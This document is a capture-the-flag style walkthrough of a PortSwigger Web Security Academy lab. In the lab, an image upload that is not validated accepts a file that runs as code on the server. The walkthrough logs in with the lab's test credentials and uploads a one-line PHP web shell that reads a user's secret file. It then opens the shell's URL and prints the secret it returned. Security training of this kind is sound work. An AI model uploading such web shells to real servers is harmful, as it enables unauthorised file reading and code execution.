---
description: >-
  https://portswigger.net/web-security/learning-paths/server-side-vulnerabilities-apprentice/file-upload-apprentice/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
icon: flask-vial
---

# Remote code execution via web shell upload

## Description

This lab contains a vulnerable image upload function. It attempts to prevent users from uploading unexpected file types, but relies on checking user-controllable input to verify this.

To solve the lab, upload a basic PHP web shell and use it to exfiltrate the contents of the file `/home/carlos/secret`. Submit this secret using the button provided in the lab banner.

You can log in to your own account using the following credentials: `wiener:peter`

## Solution

<figure><img src="../../../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

After login as Wiener user there's an upload option to upload avatar image:

<figure><img src="../../../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

with the avatar image at this path/location:

[https://0ab300990381641d80b5b7de005e0030.web-security-academy.net/resources/images/avatarDefault.svg](https://0ab300990381641d80b5b7de005e0030.web-security-academy.net/resources/images/avatarDefault.svg)

We need to obtain Carlos's secret, we can do it upload a php shell (`php_web_shell.php`) that get secret file content

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

<figure><img src="../../../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

there's not a sanitizaiton and we can upload it directly:

<figure><img src="../../../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

We know the file location and we can open it going to: [https://0ab300990381641d80b5b7de005e0030.web-security-academy.net/files/avatars/php\_web\_shell.php](https://0ab300990381641d80b5b7de005e0030.web-security-academy.net/files/avatars/php_web_shell.php)

<figure><img src="../../../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

<details>

<summary>Carlos's Secret</summary>

5707rbX0roByRQsol0HGASNWMbFg7KwJ

</details>

Obtaining Carlos's secret and solving the lab.

<figure><img src="../../../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>
